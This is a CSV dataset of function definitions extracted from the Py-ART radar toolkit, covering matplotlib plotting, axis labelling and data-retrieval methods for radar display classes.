Repository,Function_Name,Function_Code
ARM-DOE/pyart,plot_cr_raster,"def plot_cr_raster(self, field='reflectivity', target_range=None, ax=None, fig=None, delta_x=None, delta_y=None, az_limits=None, el_limits=None, vmin=None, vmax=None, cmap=None, title=None, title_flag=True, axislabels=[None, None], axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', ticks=None, ticklabs=None, raster=False):
    """"""
        Plot a corner reflector raster scan

        Parameters
        ----------
        field : String
            Field to plot if other than reflectivity
        target_range : Float
            Estimated range of the corner reflector

        Other Parameters
        ----------------
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        delta_x : Float
            Azimuth grid spacing for griddata
        delta_y : Float
            Elevation grid spacing for griddata
        az_limits : list
            Azimuth limits in form [min, max]
        el_limits : list
            Elevation limits in form [min, max]
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        raster : bool
            False by default. Set to True to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas.  Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    az = self._radar.azimuth['data']
    el = self._radar.elevation['data']
    if el[0] is None:
        raise ValueError('Elevation is set to None. CR raster plotting is unavailable for this dataset. Elevation can be set to None due to not being present per Halfword 30 Table V of the ICD for NEXRAD level 3 data.')
    rng = self._radar.range['data']
    data = self._radar.fields[field]['data']
    if az_limits is None:
        min_az = np.nanmin(az)
        max_az = np.nanmax(az)
    else:
        min_az = az_limits[0]
        max_az = az_limits[1]
    if el_limits is None:
        min_el = np.nanmin(el)
        max_el = np.nanmax(el)
    else:
        min_el = el_limits[0]
        max_el = el_limits[1]
    if delta_x is None:
        delta_x = max_az - min_az
    if delta_y is None:
        delta_y = max_el - min_el
    if target_range is None:
        target_index = 0
    else:
        target_index = np.argmin(np.abs(np.array(rng) - target_range))
    data = data[:, target_index]
    (xi, yi) = np.meshgrid(np.linspace(min_az, max_az, int(delta_x / 0.01)), np.linspace(min_el, max_el, int(delta_y / 0.01)))
    grid = griddata((az, el), data, (xi, yi), method='linear')
    pm = ax.pcolormesh(xi[0, :], yi[:, 0], grid, vmin=vmin, vmax=vmax, cmap=cmap)
    if title_flag is True:
        if title is None:
            time_str = common.generate_radar_time_begin(self._radar)
            title = ' '.join(['Corner Reflector', field.title(), time_str.strftime('%m/%d/%Y %H:%M:%S')])
        ax.set_title(title)
    if axislabels_flag is True:
        if axislabels[0] is None:
            axislabels[0] = 'Azimuth (deg)'
        if axislabels[1] is None:
            axislabels[1] = 'Elevation (deg)'
        ax.set_xlabel(axislabels[0])
        ax.set_ylabel(axislabels[1])
    if raster:
        pm.set_rasterized(True)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_range_rings,"def plot_range_rings(self, range_rings, ax=None, col='k', ls='-', lw=2):
    """"""
        Plot a series of range rings.

        Parameters
        ----------
        range_rings : list
            List of locations in km to draw range rings.
        ax : Axis
            Axis to plot on. None will use the current axis.
        col : str or value
            Color to use for range rings.
        ls : str
            Linestyle to use for range rings.

        """"""
    for range_ring_location_km in range_rings:
        self.plot_range_ring(range_ring_location_km, ax=ax, col=col, ls=ls, lw=lw)"
ARM-DOE/pyart,plot_range_ring,"@staticmethod
def plot_range_ring(range_ring_location_km, npts=100, ax=None, col='k', ls='-', lw=2):
    """"""
        Plot a single range ring.

        Parameters
        ----------
        range_ring_location_km : float
            Location of range ring in km.
        npts: int
            Number of points in the ring, higher for better resolution.
        ax : Axis
            Axis to plot on. None will use the current axis.
        col : str or value
            Color to use for range rings.
        ls : str
            Linestyle to use for range rings.

        """"""
    ax = common.parse_ax(ax)
    theta = np.linspace(0, 2 * np.pi, npts)
    r = np.ones([npts], dtype=np.float32) * range_ring_location_km
    x = r * np.sin(theta)
    y = r * np.cos(theta)
    ax.plot(x, y, c=col, ls=ls, lw=lw)"
ARM-DOE/pyart,plot_grid_lines,"@staticmethod
def plot_grid_lines(ax=None, col='k', ls=':'):
    """"""
        Plot grid lines.

        Parameters
        ----------
        ax : Axis
            Axis to plot on. None will use the current axis.
        col : str or value
            Color to use for grid lines.
        ls : str
            Linestyle to use for grid lines.

        """"""
    ax = common.parse_ax(ax)
    ax.grid(c=col, ls=ls)"
ARM-DOE/pyart,plot_labels,"def plot_labels(self, labels, locations, symbols='r+', text_color='k', ax=None):
    """"""
        Plot symbols and labels at given locations.

        Parameters
        ----------
        labels : list of str
            List of labels to place just above symbols.
        locations : list of 2-tuples
            List of latitude, longitude (in degrees) tuples at which symbols
            will be place. Labels are placed just above the symbols.
        symbols : list of str or str
            List of matplotlib color+marker strings defining symbols to place
            at given locations. If a single string is provided, that symbol
            will be placed at all locations.
        text_color : str
            Matplotlib color defining the color of the label text.
        ax : Axis
            Axis to plot on. None will use the current axis.

        """"""
    ax = common.parse_ax(ax)
    if isinstance(symbols, str):
        symbols = [symbols] * len(labels)
    if len(labels) != len(locations):
        raise ValueError('length of labels and locations must match')
    if len(labels) != len(symbols):
        raise ValueError('length of labels and symbols must match')
    for (loc, label, sym) in zip(locations, labels, symbols):
        self.plot_label(label, loc, sym, text_color, ax)"
ARM-DOE/pyart,plot_label,"def plot_label(self, label, location, symbol='r+', text_color='k', ax=None):
    """"""
        Plot a single symbol and label at a given location.

        Transforms of the symbol location in latitude and longitude units to
        x and y plot units is performed using an azimuthal equidistance
        map projection centered at the radar.

        Parameters
        ----------
        label : str
            Label text to place just above symbol.
        location : 2-tuples
            Tuple of latitude, longitude (in degrees) at which the symbol
            will be place. The label is placed just above the symbol.
        symbol : str
            Matplotlib color+marker strings defining the symbol to place
            at the given location.
        text_color : str
            Matplotlib color defining the color of the label text.
        ax : Axis
            Axis to plot on. None will use the current axis.

        """"""
    ax = common.parse_ax(ax)
    (location_lat, location_lon) = location
    (radar_lat, radar_lon) = self.loc
    (location_x, location_y) = geographic_to_cartesian_aeqd(location_lon, location_lat, radar_lon, radar_lat)
    location_x /= 1000.0
    location_y /= 1000.0
    ax.plot([location_x], [location_y], symbol)
    ax.text(location_x - 5.0, location_y, label, color=text_color)"
ARM-DOE/pyart,plot_cross_hair,"@staticmethod
def plot_cross_hair(size, npts=100, ax=None):
    """"""
        Plot a cross-hair on a ppi plot.

        Parameters
        ----------
        size : float
            Size of cross-hair in km.
        npts: int
            Number of points in the cross-hair, higher for better resolution.
        ax : Axis
            Axis to plot on. None will use the current axis.

        """"""
    ax = common.parse_ax(ax)
    x = np.zeros(npts, dtype=np.float32)
    y = np.linspace(-size, size, npts)
    ax.plot(x, y, 'k-')
    ax.plot(y, x, 'k-')"
ARM-DOE/pyart,plot_colorbar,"def plot_colorbar(self, mappable=None, field=None, label=None, orient='vertical', cax=None, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a colorbar.

        Parameters
        ----------
        mappable : Image, ContourSet, etc.
            Image, ContourSet, etc to which the colorbar applied. If None the
            last mappable object will be used.
        field : str
            Field to label colorbar with.
        label : str
            Colorbar label. None will use a default value from the last field
            plotted.
        orient : str
            Colorbar orientation, either 'vertical' [default] or 'horizontal'.
        cax : Axis
            Axis onto which the colorbar will be drawn. None is also valid.
        ax : Axes
            Axis onto which the colorbar will be drawn. None is also valid.
        fig : Figure
            Figure to place colorbar on. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        """"""
    if fig is None:
        fig = plt.gcf()
    if mappable is None:
        mappable = self.plots[-1]
    if label is None:
        if field is None:
            field = self.plot_vars[-1]
        label = self._get_colorbar_label(field)
    cb = fig.colorbar(mappable, orientation=orient, ax=ax, cax=cax, **kwargs)
    if ticks is not None:
        cb.set_ticks(ticks)
    if ticklabs:
        cb.set_ticklabels(ticklabs)
    cb.set_label(label)
    self.cbs.append(cb)"
ARM-DOE/pyart,set_limits,"@staticmethod
def set_limits(xlim=None, ylim=None, ax=None):
    """"""
        Set the display limits.

        Parameters
        ----------
        xlim : tuple, optional
            2-Tuple containing y-axis limits in km. None uses default limits.
        ylim : tuple, optional
            2-Tuple containing x-axis limits in km. None uses default limits.
        ax : Axis
            Axis to adjust. None will adjust the current axis.

        """"""
    common.set_limits(xlim, ylim, ax)"
ARM-DOE/pyart,label_xaxis_x,"def label_xaxis_x(self, ax=None):
    """"""Label the xaxis with the default label for x units.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('East West distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_y,"def label_yaxis_y(self, ax=None):
    """"""Label the yaxis with the default label for y units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('North South distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_xaxis_r,"def label_xaxis_r(self, ax=None):
    """"""Label the xaxis with the default label for r units.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_z,"def label_yaxis_z(self, ax=None):
    """"""Label the yaxis with the default label for z units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('Distance Above ' + self.origin + '  (km)')"
ARM-DOE/pyart,label_xaxis_rays,"@staticmethod
def label_xaxis_rays(ax=None):
    """"""Label the yaxis with the default label for rays.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Ray number (unitless)')"
ARM-DOE/pyart,label_xaxis_time,"@staticmethod
def label_xaxis_time(ax=None):
    """"""Label the yaxis with the default label for rays.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Time (HH:MM)')"
ARM-DOE/pyart,label_yaxis_field,"def label_yaxis_field(self, field, ax=None):
    """"""Label the yaxis with the default label for a field units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel(self._get_colorbar_label(field))"
ARM-DOE/pyart,set_aspect_ratio,"@staticmethod
def set_aspect_ratio(aspect_ratio=0.75, ax=None):
    """"""Set the aspect ratio for plot area.""""""
    ax = common.parse_ax(ax)
    ax.set_aspect(aspect_ratio)"
ARM-DOE/pyart,_set_title,"def _set_title(self, field, sweep, title, ax, datetime_format=None, use_sweep_time=True):
    """"""Set the figure title using a default title.""""""
    if title is None:
        ax.set_title(self.generate_title(field, sweep, datetime_format, use_sweep_time))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_set_vpt_title,"def _set_vpt_title(self, field, title, ax):
    """"""Set the figure title using a default title.""""""
    if title is None:
        ax.set_title(self.generate_vpt_title(field))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_set_ray_title,"def _set_ray_title(self, field, ray, title, ax):
    """"""Set the figure title for a ray plot using a default title.""""""
    if title is None:
        ax.set_title(self.generate_ray_title(field, ray))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_set_az_rhi_title,"def _set_az_rhi_title(self, field, azimuth, title, ax):
    """"""Set the figure title for a ray plot using a default title.""""""
    if title is None:
        ax.set_title(self.generate_az_rhi_title(field, azimuth))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_label_axes_ppi,"def _label_axes_ppi(self, axis_labels, ax):
    """"""Set the x and y axis labels for a PPI plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        self.label_xaxis_x(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_y(ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_rhi,"def _label_axes_rhi(self, axis_labels, ax):
    """"""Set the x and y axis labels for a RHI plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        self.label_xaxis_r(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_z(ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_ray,"def _label_axes_ray(self, axis_labels, field, ax):
    """"""Set the x and y axis labels for a ray plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        self.label_xaxis_r(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_field(field, ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_vpt,"def _label_axes_vpt(self, axis_labels, time_axis_flag, ax):
    """"""Set the x and y axis labels for a PPI plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        if time_axis_flag:
            self.label_xaxis_time(ax)
        else:
            self.label_xaxis_rays(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_z(ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_set_vpt_time_axis,"@staticmethod
def _set_vpt_time_axis(ax, date_time_form=None, tz=None):
    """"""
        Set the x axis as a time formatted axis.

        Parameters
        ----------
        ax : Matplotlib axis instance
            Axis to plot. None will use the current axis.
        date_time_form : str
            Format of the time string for x-axis labels.
        tz : str
            Time zone info to use when creating axis labels (see datetime).

        """"""
    if date_time_form is None:
        date_time_form = '%H:%M'
    date_Fmt = DateFormatter(date_time_form, tz=tz)
    ax.xaxis.set_major_formatter(date_Fmt)
    ax.tick_params(which='both', direction='out')"
ARM-DOE/pyart,generate_filename,"def generate_filename(self, field, sweep, ext='png', datetime_format='%Y%m%d%H%M%S', use_sweep_time=False):
    """"""
        Generate a filename for a plot.

        Generated filename has form:
            radar_name_field_sweep_time.ext

        Parameters
        ----------
        field : str
            Field plotted.
        sweep : int
            Sweep plotted.
        ext : str
            Filename extension.
        datetime_format : str
            Format of datetime (using strftime format).
        use_sweep_time : bool
            If true, the current sweep's beginning time is used.

        Returns
        -------
        filename : str
            Filename suitable for saving a plot.

        """"""
    return common.generate_filename(self._radar, field, sweep, ext, datetime_format, use_sweep_time)"
ARM-DOE/pyart,generate_title,"def generate_title(self, field, sweep, datetime_format=None, use_sweep_time=True):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        sweep : int
            Sweep plotted.
        datetime_format : str
            Format of datetime (using strftime format).
        use_sweep_time : bool
            If true, the current sweep's beginning time is used.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_title(self._radar, field, sweep, datetime_format, use_sweep_time)"
ARM-DOE/pyart,generate_vpt_title,"def generate_vpt_title(self, field):
    """"""
        Generate a title for a VPT plot.

        Parameters
        ----------
        field : str
            Field plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_vpt_title(self._radar, field)"
ARM-DOE/pyart,generate_ray_title,"def generate_ray_title(self, field, ray):
    """"""
        Generate a title for a ray plot.

        Parameters
        ----------
        field : str
            Field plotted.
        ray : int
            Ray plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_ray_title(self._radar, field, ray)"
ARM-DOE/pyart,generate_az_rhi_title,"def generate_az_rhi_title(self, field, azimuth):
    """"""
        Generate a title for a ray plot.

        Parameters
        ----------
        field : str
            Field plotted.
        azimuth : float
            Azimuth plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_az_rhi_title(self._radar, field, azimuth)"
ARM-DOE/pyart,_get_data,"def _get_data(self, field, sweep, mask_tuple, filter_transitions, gatefilter):
    """"""Retrieve and return data from a plot function.""""""
    sweep_slice = self._radar.get_slice(sweep)
    data = self.fields[field]['data'][sweep_slice]
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data'][sweep_slice]
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded[sweep_slice]
        data = np.ma.masked_array(data, mask_filter)
    if filter_transitions and self.antenna_transition is not None:
        in_trans = self.antenna_transition[sweep_slice]
        data = data[in_trans != 1]
    return data"
ARM-DOE/pyart,_get_vpt_data,"def _get_vpt_data(self, field, mask_tuple, filter_transitions, gatefilter):
    """"""Retrieve and return vpt data from a plot function.""""""
    data = self.fields[field]['data']
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data']
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded
        data = np.ma.masked_array(data, mask_filter)
    if filter_transitions and self.antenna_transition is not None:
        in_trans = self.antenna_transition
        data = data[in_trans != 1]
    return data.T"
ARM-DOE/pyart,_get_ray_data,"def _get_ray_data(self, field, ray, mask_tuple, gatefilter):
    """"""Retrieve and return ray data from a plot function.""""""
    data = self.fields[field]['data'][ray]
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data'][ray]
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded[ray]
        data = np.ma.masked_array(data, mask_filter)
    return data"
ARM-DOE/pyart,_get_azimuth_rhi_data_x_y_z,"def _get_azimuth_rhi_data_x_y_z(self, field, target_azimuth, edges, mask_tuple, filter_transitions, gatefilter):
    """"""Retrieve and return pseudo-RHI data from a plot function.""""""
    data = self.fields[field]['data']
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data']
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded
        data = np.ma.masked_array(data, mask_filter)
    if filter_transitions and self.antenna_transition is not None:
        in_trans = self.antenna_transition
        data = data[in_trans == 0]
    prhi_rays = []
    for sweep_slice in self._radar.iter_slice():
        sweep_azimuths = self.azimuths[sweep_slice]
        ray_number = np.argmin(np.abs(sweep_azimuths - target_azimuth))
        prhi_rays.append(ray_number + sweep_slice.start)
    azimuth = self.azimuths[prhi_rays]
    if self.elevations[0] is None:
        raise ValueError('Elevation is set to None. RHI plotting is unavailable for this dataset. Elevation can be set to None due to not being present per Halfword 30 Table V of the ICD for NEXRAD level 3 data.')
    elevation = self.elevations[prhi_rays]
    data = data[prhi_rays]
    rng = self.ranges
    if edges and len(prhi_rays) == 1:
        rng = self.ranges[:-1]
    (x, y, z) = antenna_vectors_to_cartesian(rng, azimuth, elevation, edges=edges)
    x = (x + self.shift[0]) / 1000.0
    y = (y + self.shift[1]) / 1000.0
    z = z / 1000.0
    return (data, x, y, z)"
ARM-DOE/pyart,_get_x_z,"def _get_x_z(self, sweep, edges, filter_transitions):
    """"""Retrieve and return x and z coordinate in km.""""""
    (x, _, z) = self._get_x_y_z(sweep, edges, filter_transitions)
    return (x, z)"
ARM-DOE/pyart,_get_x_y,"def _get_x_y(self, sweep, edges, filter_transitions):
    """"""Retrieve and return x and y coordinate in km.""""""
    (x, y, _) = self._get_x_y_z(sweep, edges, filter_transitions)
    return (x, y)"
ARM-DOE/pyart,_get_x_y_z,"def _get_x_y_z(self, sweep, edges, filter_transitions):
    """"""Retrieve and return x, y, and z coordinate in km.""""""
    (x, y, z) = self._radar.get_gate_x_y_z(sweep, edges=edges, filter_transitions=filter_transitions)
    x = (x + self.shift[0]) / 1000.0
    y = (y + self.shift[1]) / 1000.0
    z = z / 1000.0
    return (x, y, z)"
ARM-DOE/pyart,_get_colorbar_label,"def _get_colorbar_label(self, field):
    """"""Return a colorbar label for a given field.""""""
    last_field_dict = self.fields[field]
    if 'standard_name' in last_field_dict:
        standard_name = last_field_dict['standard_name']
    elif 'long_name' in last_field_dict:
        standard_name = last_field_dict['long_name']
    else:
        standard_name = field
    if 'units' in last_field_dict:
        units = last_field_dict['units']
    else:
        units = '?'
    return common.generate_colorbar_label(standard_name, units)"
ARM-DOE/pyart,__init__,"def __init__(self, radar, shift=(0.0, 0.0)):
    """"""Initialize the object.""""""
    self.fixed_angle = radar.fixed_angle['data'][0]
    self.rotation = radar.rotation['data']
    self.roll = radar.roll['data']
    self.drift = radar.drift['data']
    self.tilt = radar.tilt['data']
    self.heading = radar.heading['data']
    self.pitch = radar.pitch['data']
    self.altitude = radar.altitude['data']
    super().__init__(radar, shift)
    middle_lat = int(radar.latitude['data'].shape[0] / 2)
    middle_lon = int(radar.longitude['data'].shape[0] / 2)
    lat = float(radar.latitude['data'][middle_lat])
    lon = float(radar.longitude['data'][middle_lon])
    self.loc = (lat, lon)"
ARM-DOE/pyart,plot,"def plot(self, field, sweep=0, **kwargs):
    """"""
        Create a plot appropiate for the radar.

        This function calls the plotting function corresponding to
        the scan_type of the radar. Additional keywords can be passed to
        customize the plot, see the appropiate plot function for the
        allowed keywords.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int
            Sweep number to plot, not used for VPT scans.

        See Also
        --------
        plot_ppi : Plot a PPI scan
        plot_sweep_grid : Plot a RHI or VPT scan

        """"""
    if self.scan_type == 'ppi':
        self.plot_ppi(field, sweep, **kwargs)
    elif self.scan_type == 'rhi':
        self.plot_sweep_grid(field, sweep, **kwargs)
    elif self.scan_type == 'vpt':
        self.plot_sweep_grid(field, sweep, **kwargs)
    else:
        raise ValueError('unknown scan_type % s' % self.scan_type)
    return"
ARM-DOE/pyart,plot_sweep_grid,"def plot_sweep_grid(self, field, sweep=0, ignoreTilt=False, mask_tuple=None, vmin=None, vmax=None, cmap=None, norm=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, filter_transitions=True, ax=None, fig=None, gatefilter=None, raster=False, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a sweep as a grid.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int, optional
            Sweep number to plot.

        Other Parameters
        ----------------
        ignoreTilt : bool
            True to ignore tilt angle when running the
            antenna_to_cartesian_track_relative coordinate transformation (by
            setting tilt angle to 0), effectively plotting data relative to
            slant range (the same plotting method utilized by the NCAR
            soloii/3 software). False (default) plots relative to the aircraft
            longitudinal axis.
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            plotted.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        raster : bool
            False by default. Set to true to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas. Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self._get_data(field, sweep, mask_tuple, filter_transitions, gatefilter)
    (x, z) = self._get_x_z(sweep, edges, filter_transitions, ignoreTilt=ignoreTilt)
    if mask_outside:
        data = np.ma.masked_invalid(data)
        data = np.ma.masked_outside(data, vmin, vmax)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(x, z, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if title_flag:
        self._set_title(field, sweep, title, ax)
    if axislabels_flag:
        self._label_axes_rhi(axislabels, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,label_xaxis_x,"def label_xaxis_x(self, ax=None):
    """"""Label the xaxis with the default label for x units.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Horizontal distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_y,"def label_yaxis_y(self, ax=None):
    """"""Label the yaxis with the default label for y units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('Horizontal distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_z,"def label_yaxis_z(self, ax=None):
    """"""Label the yaxis with the default label for z units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('Distance Above ' + self.origin + '  (km)')"
ARM-DOE/pyart,_get_x_z,"def _get_x_z(self, sweep, edges, filter_transitions, ignoreTilt=False):
    """"""Retrieve and return x and z coordinate in km.""""""
    (x, _, z) = self._get_x_y_z(sweep, edges, filter_transitions, ignoreTilt=ignoreTilt)
    return (x, z)"
